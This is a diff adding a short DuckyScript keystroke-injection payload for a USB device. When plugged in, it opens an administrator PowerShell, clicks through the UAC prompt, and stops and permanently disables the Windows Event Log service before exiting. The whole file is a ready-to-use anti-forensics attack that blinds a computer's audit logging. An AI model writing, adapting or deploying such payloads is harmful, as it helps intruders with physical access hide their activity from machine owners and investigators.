@@ -1,0 +1,16 @@
+DUCKY_LANG DE_CH
+DELAY 50
+GUI x
+DELAY 100
+STRINGLN a
+DELAY 600
+REM replace the following line with the admin password if necessary
+LEFTARROW
+DELAY 50
+ENTER
+DELAY 2000
+STRINGLN Stop-Service -Name "eventlog"
+DELAY 200
+STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
+DELAY 300
+STRINGLN exit
